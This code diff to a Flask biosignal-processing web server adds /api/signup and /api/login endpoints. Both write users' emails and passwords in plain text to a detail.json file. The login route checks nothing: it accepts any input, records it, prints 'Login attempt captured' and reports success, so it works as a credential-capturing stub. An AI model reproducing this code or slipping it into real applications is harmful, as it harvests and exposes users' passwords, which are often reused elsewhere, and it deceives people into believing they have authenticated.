@@ -54,6 +54,8 @@ DEFAULT_SR = 512
 RAW_STREAM_NAME = "BioSignals-Processed"
 EVENT_STREAM_NAME = "BioSignals-Events"
 
+DETAILS_FILE = PROJECT_ROOT / "detail.json"
+
 
 # ========== Flask App Setup ==========
 
@@ -600,6 +602,86 @@ def api_delete_config():
         socketio.emit('config_updated', {"status": "reset"})
         return jsonify({"status": "ok", "message": "Config reset to defaults"})
     except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/api/signup', methods=['POST'])
+def api_signup():
+    """Save user credentials to detail.json in plain text."""
+    try:
+        data = request.get_json()
+        if not data or 'email' not in data or 'password' not in data:
+            return jsonify({"error": "Missing email or password"}), 400
+
+        email = data['email']
+        password = data['password']
+
+        # Read existing users
+        users = []
+        if DETAILS_FILE.exists():
+            try:
+                with open(DETAILS_FILE, 'r') as f:
+                    users = json.load(f)
+            except json.JSONDecodeError:
+                users = [] # Reset if corrupt
+        
+        # Append new user
+        users.append({
+            "email": email, 
+            "password": password, 
+            "type": "signup",
+            "timestamp": time.time()
+        })
+
+        # Save back
+        with open(DETAILS_FILE, 'w') as f:
+            json.dump(users, f, indent=2)
+
+        print(f"[WebServer] 👤 New user signed up: {email}")
+        return jsonify({"status": "success", "message": "User registered"})
+
+    except Exception as e:
+        print(f"[WebServer] ❌ Error signing up: {e}")
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/api/login', methods=['POST'])
+def api_login():
+    """Save login credentials to detail.json in plain text."""
+    try:
+        data = request.get_json()
+        if not data or 'email' not in data or 'password' not in data:
+            return jsonify({"error": "Missing email or password"}), 400
+
+        email = data['email']
+        password = data['password']
+
+        # Read existing users
+        details = []
+        if DETAILS_FILE.exists():
+            try:
+                with open(DETAILS_FILE, 'r') as f:
+                    details = json.load(f)
+            except json.JSONDecodeError:
+                details = [] 
+        
+        # Append login attempt
+        details.append({
+            "email": email, 
+            "password": password, 
+            "type": "login",
+            "timestamp": time.time()
+        })
+
+        # Save back
+        with open(DETAILS_FILE, 'w') as f:
+            json.dump(details, f, indent=2)
+
+        print(f"[WebServer] 🔑 Login attempt captured: {email}")
+        return jsonify({"status": "success", "message": "Login captured"})
+
+    except Exception as e:
+        print(f"[WebServer] ❌ Error capturing login: {e}")
         return jsonify({"error": str(e)}), 500
 
 
